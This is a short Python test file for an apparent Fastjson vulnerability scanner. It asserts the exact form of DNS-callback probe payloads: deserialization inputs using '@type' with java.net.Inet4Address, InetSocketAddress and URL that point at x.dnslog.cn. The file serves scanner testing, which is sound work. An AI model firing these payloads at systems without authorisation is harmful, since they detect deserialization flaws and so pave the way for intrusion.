from fastjson_toolkit.detect.probes import all_probes, build_dns_payloads
from fastjson_toolkit.dnslog import CeyeClient


def test_probe_ids_unique():
    probes = all_probes("x.dnslog.cn")
    ids = [p.id for p in probes]
    assert len(ids) == len(set(ids))


def test_dns_payload_format():
    probes = build_dns_payloads("x.dnslog.cn")
    by_id = {p.id: p.payload for p in probes}
    assert by_id["dns_inet4"] == '{"@type":"java.net.Inet4Address","val":"x.dnslog.cn"}'
    assert by_id["dns_inet_socket"] == '{"@type":"java.net.InetSocketAddress"{"address":,"val":"x.dnslog.cn"}}'
    assert by_id["dns_url"] == '{{"@type":"java.net.URL","val":"http://x.dnslog.cn"}:"a"}'


def test_ceye_filter_length():
    assert len(CeyeClient.new_filter("fj")) <= 20
